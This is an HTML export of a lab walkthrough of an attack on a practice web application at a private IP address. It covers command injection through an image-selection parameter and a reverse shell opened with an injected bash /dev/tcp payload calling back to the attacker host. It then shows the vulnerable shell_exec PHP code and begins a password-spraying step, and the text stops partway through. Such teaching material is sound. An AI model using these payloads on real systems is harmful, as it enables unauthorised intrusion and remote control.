<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Walkthrough</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.page-description {
    margin-bottom: 2em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
.select-value-color-pageGlass { background-color: undefined; }
.select-value-color-washGlass { background-color: undefined; }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="732913bd-e1ba-4cc1-96d8-1cb1d7c1234c" class="page sans"><header><h1 class="page-title">Walkthrough</h1><p class="page-description"></p></header><div class="page-body"><h2 id="f3570f7b-4785-43bf-b1e1-0ed86deb72ca" class="">Authors:</h2><p id="98196fd6-a772-4e83-aa60-f17930215891" class="">Kai Johnson and Yusuf Ismail</p><h2 id="031aa62d-af86-4568-b4ed-fd4f8bb4d58b" class="">Introduction:</h2><p id="38b559c2-3737-4191-bebc-ae8367f623a4" class="">
</p><p id="0a0ebb5c-7324-4905-80b2-becde28e56e9" class="">In this walkthrough, we&#x27;ll dissect a multi-stage attack against a web application.  The focus will be on three core vulnerabilities:</p><ul id="5a89b021-dd84-495d-a898-ad064c4221e9" class="bulleted-list"><li style="list-style-type:disc"><strong>Command Injection:</strong> Allowing the execution of arbitrary commands on the web server.</li></ul><ul id="b4b18570-4240-413c-96ef-505faf7ad1fe" class="bulleted-list"><li style="list-style-type:disc"><strong>Password Spraying:</strong> Exploiting weak password policies to gain user credentials.</li></ul><ul id="67ef9f91-1bb7-4d80-87d2-6c769b08205a" class="bulleted-list"><li style="list-style-type:disc"><strong>LD_PRELOAD Misconfiguration:</strong> Leveraging a sudoers misconfiguration to escalate privileges.</li></ul><p id="6f213025-cc2a-423e-ac4f-e21b2ad665c1" class="">Target IP = 10.0.2.6</p><p id="1ef66f6f-f98e-489d-9785-1491cc0a5a50" class="">Attacker IP = 10.0.2.1</p><p id="686c30ff-f2d7-4d7f-9544-39165f980141" class="">
</p><details open=""><summary style="font-weight:600;font-size:1.875em;line-height:1.3;margin:0">1. Command Injection</summary><div class="indented"><p id="657f172a-2c33-439a-948c-992dc6ed9098" class="">Navigate to the target IP in your browser, to find a very simple website shown below. We could have run nmap to figure out which port hosts the server, but in our case, it is on the default port for HTTP.</p><blockquote id="a9def39d-9fa6-4e9e-9182-c41df4811056" class=""><a href="http://10.0.2.6">http://10.0.2.6</a></blockquote><figure id="b0ec2e20-5671-4d0e-9535-0b3cf0e7d11e" class="image"><a href="Walkthrough/Untitled.png"><img style="width:432px" src="Walkthrough/Untitled.png"/></a></figure><p id="4ffbbce0-fa8d-431b-afe9-b6d853f1d70b" class="">Looking at the Animal Pictures page, we find that it is also a simple web page containing a dropdown to show three animals that you can choose from.</p><figure id="789ecb10-95cc-419e-9329-b1928d789c29" class="image"><a href="Walkthrough/Untitled%201.png"><img style="width:438px" src="Walkthrough/Untitled%201.png"/></a></figure><p id="58707d4f-bbac-46c4-8b7b-32e8631d86b8" class="">When we click Change Image button, we are redirected to</p><h3 id="63a981f8-3ef1-4e1b-9963-2db4d952ec77" class="">Normal Intention</h3><blockquote id="8eedd7fb-28ac-4174-8694-02b324bd6f0a" class=""><strong><a href="http://10.0.2.6/is_existant.php?img=image1.png">http://10.0.2.6/is_existant.php?img=image1.png</a></strong></blockquote><p id="6ed233c8-63d9-43dc-beff-715efac06dfd" class="">which contains the following HTML</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cc90725e-0685-41df-866d-aa3124918619" class="code"><code class="language-JavaScript">&lt;img src=&quot;/assets/image1.png&quot; width=&quot;400&quot;&gt;</code></pre><p id="5c7e62fc-24c5-4c0d-a942-aa1d619a7d24" class="">We guess that <strong>is_existant.php</strong> script seems to check if an image exists or not and serves it. We can try to manipulate the dropdown values to execute a command on the server backend.</p><h2 id="1c84e5a6-e5fa-4ae0-989e-706c67f29f61" class="">Simple Command Injection</h2><p id="61e61819-1663-475b-b20a-f53e7d53971f" class="">We try inserting a semicolon and a simple shell command to one of the values of the dropdown menu by changing the HTML code for it resulting in the following option.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c8d1e842-6b77-4dee-b67e-538c2ca42c32" class="code"><code class="language-JavaScript">&lt;option value=&quot;image1.png;whoami&quot;&gt;rabbit&lt;/option&gt;</code></pre><p id="7f9279c1-fc21-4867-95d3-ab7093a9abab" class="">We notice we get directed to this link</p><blockquote id="474e1aac-dac6-464f-9614-0dbc290e5cf6" class=""><strong><a href="http://10.0.2.6:8000/is_existant.php?img=image1.png%3Bwhoami">http://10.0.2.6:8000/is_existant.php?img=image1.png%3Bwhoami</a></strong></blockquote><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b13b15b5-5957-4e7c-8108-2998bfdff75d" class="code"><code class="language-JavaScript">&lt;img src=&quot;www-data&quot; width=&quot;400&quot;&gt;</code></pre><h2 id="c4c6e98e-eabe-4203-a764-7530c7327cff" class="">Acquiring a Reverse Shell</h2><p id="643a93f6-b47b-49bc-81cb-bdb254312123" class="">We now open a netcat listening socket on port 4444 using </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4fd66e46-5f4d-479a-81a6-1f9b4f51e08f" class="code"><code class="language-Shell">nc -lvnp 4444</code></pre><p id="b8b706fd-485e-4667-9256-f839e15c4f40" class="">We then Generate a reverse shell command to connect to our socket which when injected looks like</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9b2f83b4-6279-447d-9ba8-b077a209a4c3" class="code"><code class="language-HTML" style="white-space:pre-wrap;word-break:break-all">&lt;option value=&quot;image1.png;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.0.2.1/4444 0&gt;&amp;1&#x27;&quot;&gt;rabbit&lt;/option&gt;</code></pre><p id="86742d4f-bb31-4a4e-b9c7-7071dfb37a0c" class="">Upon clicking Change Image button, our attacker shell will look like</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ed706952-3f3a-43cd-bd54-0b3f7e9a54e9" class="code"><code class="language-Shell">nc -lvn 4444
www-data@kali:/var/www/html$ </code></pre><p id="b6a170b5-97d9-4b3b-b1ff-3cfc1b92c668" class="">Now that we are inside the server as www-data user, we can view is_existant.php to see where the vulnerability came from. As shown below, this vulnerability is due trusting the user input and executing it directly.</p><p id="a23bfe60-7f94-49b1-9b83-da589310feb9" class="">
</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d35cf778-0419-4e63-9fe7-a8013a05a44e" class="code"><code class="language-PHP" style="white-space:pre-wrap;word-break:break-all">&lt;!--is_existant.php--&gt;

&lt;?php
	...
		$image_name = $_GET[&#x27;img&#x27;];
		
		$output = shell_exec(&quot;[ -f ./assets/$image_name ] &amp;&amp; echo /assets/$image_name || echo &#x27;File does not exist&#x27;&quot;);
	...
	?&gt;
</code></pre><p id="ccd01164-4bd4-4940-b3d9-3e44b62a40ad" class="">
</p><p id="afc8250e-1d27-4d89-a863-de0427a604a6" class="">
</p></div></details><details open=""><summary style="font-weight:600;font-size:1.875em;line-height:1.3;margin:0">2. Password Spraying</summary><div class="indented"><h2 id="b107b9af-17f6-43e4-a394-a7352f2bbeb2" class="">Investigating</h2><p id="a523687f-311c-46f8-a805-f07f96c30690" class="">We try to look at the current directory to see if there is anything important.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a53ee828-0085-462d-9400-5e5fedbe71c2" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">www-data@kali:/var/www/html$ ls -l
-rwxr-x--- 1 root bar    26 Mar  9 20:32 script.sh
...</code></pre><p id="56a6ad96-426e-4742-91bd-0f9803b78c18" class="">The only interesting thing is this script called script.sh that group bar has execute permissions on without read or write permissions. We go to see who is in this group and we find user2 as a member of the group</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="81c1fad4-f130-4630-865e-dbc18ea3f4ed" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">www-data@kali:/var/www/html$ cat /etc/group | grep bar
bar:x:1001:user2</code></pre><p id="83bc38a2-32ca-4073-beb3-6926f017e132" class="">Maybe if we break in to user2 we could find something important. We end our reverse shell and go to </p><blockquote id="fe056f08-8b8b-48cf-bf78-3b727350937f" class=""><a href="http://10.0.2.6/login.php">http://10.0.2.6/login.php</a></blockquote><figure id="5c5a6e7e-68dd-4c6f-89f2-56786264553d" class="image"><a href="Walkthrough/Untitled%202.png"><img style="width:384px" src="Walkthrough/Untitled%202.png"/></a></figure><p id="988e393b-b488-4478-8d4d-5ea03bf2c6e9" class="">The note says that the password is 6 digit so there should be 10^6 possibilities. These are  000000, 000001, … 999999</p><p id="6cd860c7-3574-472f-8fc3-b7167540c15a" class="">We also find that the form element is </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" 